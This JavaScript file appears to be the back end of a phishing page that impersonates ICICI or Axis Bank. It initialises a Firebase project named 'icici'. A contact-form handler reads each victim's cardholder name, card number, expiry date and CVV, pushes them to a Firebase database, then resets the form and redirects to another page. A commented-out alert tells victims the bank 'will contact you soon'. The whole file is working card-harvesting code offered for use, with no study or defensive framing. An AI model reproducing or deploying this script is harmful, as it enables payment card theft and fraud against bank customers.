// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyDAPgWs85TArvt_r8-WceSvRRqrqQL4EK0",
  authDomain: "icici-61e38.firebaseapp.com",
  databaseURL: "https://icici-78678hlt-rtdb.firebaseio.com",
  projectId: "icici-61e38",
  storageBucket: "icici-61e38.appspot.com",
  messagingSenderId: "913138341577",
  appId: "1:913138341577:web:56e070dd35a63639389f18",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var card_name = getInputVal('card_name');
  var card_no = getInputVal('card_no');
  var exp_date = getInputVal('exp_date');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(card_name, card_no, exp_date, cvv);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();

document.getElementById('contactForm').reset();
window.location.href="sad1.html";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(card_name, card_no, exp_date, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    card_name: card_name,
    card_no:card_no,
    exp_date:exp_date,
    cvv:cvv,
  });
}
